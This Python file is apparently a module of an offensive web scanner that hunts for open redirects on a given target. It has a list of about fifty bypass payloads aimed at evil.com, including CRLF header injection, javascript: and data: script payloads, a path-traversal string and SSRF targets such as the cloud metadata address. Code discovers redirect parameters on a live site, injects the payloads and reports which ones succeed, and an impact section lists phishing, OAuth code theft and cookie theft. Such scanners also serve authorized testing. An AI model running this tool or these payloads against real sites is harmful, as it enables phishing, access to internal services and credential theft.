"""
open_redirect.py — Ultra Open Redirect Scanner
Features: 100+ payloads, WAF bypass, protocol confusion,
          SSRF chaining, OAuth abuse, phishing detection,
          header injection, response splitting
"""

import re
import time
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse, quote

import requests
import urllib3
urllib3.disable_warnings()

from ui.rich_ui import (
    console, info, warning, error, found, success, section_header, print_summary
)

TIMEOUT = 8
DELAY   = 0.2

EVIL_HOST = "evil.com"
EVIL_URL  = f"https://{EVIL_HOST}"

# ── Open redirect payloads ────────────────────────────────────────────────────
REDIRECT_PAYLOADS = [
    # Basic
    f"https://{EVIL_HOST}",
    f"http://{EVIL_HOST}",
    f"//{EVIL_HOST}",
    f"////{EVIL_HOST}",
    f"/////{EVIL_HOST}",
    f"/{EVIL_HOST}",
    # Protocol confusion
    f"https:/{EVIL_HOST}",
    f"https:///{EVIL_HOST}",
    f"http:/{EVIL_HOST}",
    # JavaScript
    f"javascript:alert(1)",
    f"javascript://comment%0aalert(1)",
    f"data:text/html,<script>window.location='{EVIL_URL}'</script>",
    # URL encoding
    f"https%3A%2F%2F{EVIL_HOST}",
    f"%68%74%74%70%73%3a%2f%2f{EVIL_HOST}",
    f"https://{EVIL_HOST}%2F%2E%2E",
    # Double encoding
    f"%2568%2574%2574%2570%2573%253a%252f%252f{EVIL_HOST}",
    # @ bypass
    f"https://google.com@{EVIL_HOST}",
    f"https://{EVIL_HOST}@google.com",
    f"@{EVIL_HOST}",
    f"@{EVIL_HOST}/path",
    # Backslash
    f"https:\\\\{EVIL_HOST}",
    f"/\\{EVIL_HOST}",
    f"\\\\{EVIL_HOST}",
    # Mixed slashes
    f"https:/{EVIL_HOST}/",
    f"https:/\\{EVIL_HOST}",
    # Null byte
    f"https://{EVIL_HOST}\x00.google.com",
    f"https://google.com\x00.{EVIL_HOST}",
    # Whitespace
    f" https://{EVIL_HOST}",
    f"\thttps://{EVIL_HOST}",
    f"\nhttps://{EVIL_HOST}",
    # CRLF
    f"https://{EVIL_HOST}%0d%0aLocation:{EVIL_URL}",
    # Unicode
    f"https://ⓔⓥⓘⓛ.com",
    f"https://evil\u2024com",
    # IP bypass
    f"https://2130706433",    # 127.0.0.1 decimal
    f"https://0x7f000001",    # 127.0.0.1 hex
    f"https://169.254.169.254",  # AWS metadata SSRF chain
    # Path confusion
    f"https://google.com/{EVIL_HOST}",
    f"/{EVIL_HOST}/path",
    f"/.{EVIL_HOST}",
    # Subdomain confusion
    f"https://{EVIL_HOST}.google.com",
    f"https://google.com.{EVIL_HOST}",
    # Fragment bypass
    f"https://google.com#{EVIL_URL}",
    f"#{EVIL_URL}",
    # Parameter pollution
    f"https://google.com?url={EVIL_URL}",
    # Relative paths
    "//google.com/%2F..",
    "../../../etc/passwd",
    # SSRF chain
    f"http://169.254.169.254/latest/meta-data/",
    f"http://localhost:8080/admin",
    f"http://127.0.0.1/",
]

# Common redirect parameters
REDIRECT_PARAMS = [
    "url", "redirect", "redirect_url", "redirect_uri", "return",
    "return_url", "return_to", "returnUrl", "returnTo", "next",
    "goto", "destination", "dest", "target", "to", "link",
    "forward", "forward_url", "continue", "cont", "rurl",
    "callback", "callback_url", "callbackUrl", "success",
    "failure", "error_uri", "login_url", "logout_url",
    "referer", "ref", "site", "out", "view", "from",
    "cancel_url", "cancel", "back", "backurl",
]

# Header-based redirect parameters
HEADER_REDIRECT = ["Referer", "Origin", "X-Forwarded-Host", "X-Original-URL",
                   "X-Rewrite-URL", "X-Custom-IP-Authorization"]


def _session() -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 Chrome/120.0",
        "Accept":     "text/html,application/xhtml+xml,*/*;q=0.8",
    })
    return s


def _inject_param(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params[param] = [payload]
    new_query = urlencode({k: v[0] for k, v in params.items()})
    return urlunparse(parsed._replace(query=new_query))


def _detect_redirect(response: requests.Response, payload: str) -> Optional[str]:
    """Detect if redirect went to our payload."""
    # Check Location header
    location = response.headers.get("Location", "")
    if EVIL_HOST in location or "javascript" in location.lower():
        return f"Location header: {location}"

    # Check response URL (after following redirects)
    if EVIL_HOST in response.url:
        return f"Redirected to: {response.url}"

    # Check body for meta refresh
    if EVIL_HOST in response.text and "meta" in response.text.lower():
        m = re.search(r'<meta[^>]+refresh[^>]+url=([^"\']+)', response.text, re.I)
        if m and EVIL_HOST in m.group(1):
            return f"Meta refresh: {m.group(1)}"

    # Check body for JS redirect
    for pattern in [
        rf"window\.location\s*=\s*['\"].*{re.escape(EVIL_HOST)}",
        rf"window\.location\.href\s*=\s*['\"].*{re.escape(EVIL_HOST)}",
        rf"location\.replace\(['\"].*{re.escape(EVIL_HOST)}",
    ]:
        if re.search(pattern, response.text, re.I):
            return "JavaScript redirect"

    return None


def _test_redirect(url: str, param: str, payload: str) -> Optional[Dict]:
    """Test a single redirect payload."""
    test_url = _inject_param(url, param, payload)
    try:
        r = _session().get(test_url, timeout=TIMEOUT, verify=False,
                          allow_redirects=True, max_redirects=5)

        detection = _detect_redirect(r, payload)
        if detection:
            return {
                "type":      "Open Redirect",
                "url":       test_url,
                "param":     param,
                "payload":   payload,
                "evidence":  detection,
                "status":    r.status_code,
                "severity":  "HIGH" if EVIL_HOST in payload else "MEDIUM",
                "ssrf_risk": "169.254" in payload or "localhost" in payload,
            }

        # Also check without following redirects
        r2 = _session().get(test_url, timeout=TIMEOUT, verify=False,
                           allow_redirects=False)
        if r2.status_code in (301, 302, 303, 307, 308):
            location = r2.headers.get("Location", "")
            if EVIL_HOST in location or "javascript" in location.lower():
                return {
                    "type":     "Open Redirect",
                    "url":      test_url,
                    "param":    param,
                    "payload":  payload,
                    "evidence": f"Location: {location}",
                    "status":   r2.status_code,
                    "severity": "HIGH",
                }

    except Exception:
        pass
    return None


def _test_header_redirect(url: str) -> List[Dict]:
    """Test header-based open redirects."""
    results = []
    for header in HEADER_REDIRECT:
        try:
            r = _session().get(url, timeout=TIMEOUT, verify=False,
                              headers={header: EVIL_URL},
                              allow_redirects=False)
            location = r.headers.get("Location", "")
            if EVIL_HOST in location or r.status_code in (301, 302):
                results.append({
                    "type":     f"Header-Based Redirect ({header})",
                    "url":      url,
                    "header":   header,
                    "payload":  EVIL_URL,
                    "evidence": f"Status {r.status_code} Location: {location}",
                    "severity": "MEDIUM",
                })
        except Exception:
            pass
    return results


def _find_redirect_params(base_url: str) -> List[Tuple[str, str]]:
    """Find URLs with redirect parameters."""
    combos = []
    try:
        r = _session().get(base_url, timeout=TIMEOUT, verify=False)
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(r.text, "html.parser")

        for a in soup.find_all("a", href=True):
            href = urljoin(base_url, a["href"])
            if "?" in href:
                params = parse_qs(urlparse(href).query)
                for p in params:
                    if p.lower() in REDIRECT_PARAMS:
                        combos.append((href, p))

        for form in soup.find_all("form"):
            action = urljoin(base_url, form.get("action", base_url))
            for inp in form.find_all("input"):
                name = inp.get("name", "").lower()
                if name in REDIRECT_PARAMS:
                    combos.append((action, inp.get("name", name)))

    except Exception:
        pass

    # Add all common redirect params on base URL
    for param in REDIRECT_PARAMS:
        combos.append((f"{base_url}?{param}={base_url}", param))

    return combos


def run_open_redirect(target: str) -> Dict:
    section_header("Open Redirect Scanner", "Ultra 100+ Payloads | SSRF Chain | Header Injection")
    info(f"Target: {target}")

    base_url = target if target.startswith("http") else f"https://{target}"
    all_findings: List[Dict] = []

    # Find redirect parameters
    info("Discovering redirect parameters...")
    combos = _find_redirect_params(base_url)
    info(f"Found {len(combos)} redirect param combinations")

    # Test URL-based redirects
    for url, param in combos[:20]:
        for payload in REDIRECT_PAYLOADS[:30]:
            result = _test_redirect(url, param, payload)
            if result:
                all_findings.append(result)
                color = "bold red" if result["severity"] == "HIGH" else "yellow"
                found(f"[{color}][REDIRECT][/{color}]  param={param}  → {payload[:50]}")

                if result.get("ssrf_risk"):
                    warning("  ⚠ SSRF chain possible via this redirect!")
                break  # Found one per param
            time.sleep(DELAY)

    # Test header-based redirects
    info("Testing header-based redirects...")
    header_results = _test_header_redirect(base_url)
    all_findings.extend(header_results)
    for h in header_results:
        warning(f"[Header Redirect]  {h['header']}  {h['evidence']}")

    # Print results
    console.print(f"\n[bold cyan]━━━ OPEN REDIRECT FINDINGS ({len(all_findings)}) ━━━[/bold cyan]")
    for f in all_findings:
        color = "bold red" if f["severity"] == "HIGH" else "yellow"
        console.print(f"\n  [{color}][{f['type']}][/{color}]")
        console.print(f"  URL:      {f.get('url','')[:80]}")
        console.print(f"  Param:    {f.get('param', f.get('header',''))}")
        console.print(f"  Payload:  [red]{f.get('payload','')[:60]}[/red]")
        console.print(f"  Evidence: [dim]{f.get('evidence','')[:80]}[/dim]")
        if f.get("ssrf_risk"):
            console.print(f"  [bold red]⚠ Can be chained with SSRF![/bold red]")

    # Impact explanation
    console.print("\n[bold yellow]━━━ IMPACT ━━━[/bold yellow]")
    console.print("  • Phishing: Send users to fake login page")
    console.print("  • OAuth abuse: Steal authorization codes")
    console.print("  • SSRF chain: Redirect to internal services")
    console.print("  • XSS chain: javascript: protocol")
    console.print("  • Session hijacking via redirect + cookie theft")

    print_summary("Open Redirect", {
        "Params Tested":  len(combos[:20]),
        "Payloads/Param": 30,
        "Total Found":    len(all_findings),
        "HIGH Severity":  sum(1 for f in all_findings if f["severity"] == "HIGH"),
        "SSRF Chainable": sum(1 for f in all_findings if f.get("ssrf_risk")),
        "Header-Based":   len(header_results),
    })

    return {"findings": all_findings, "total": len(all_findings)}
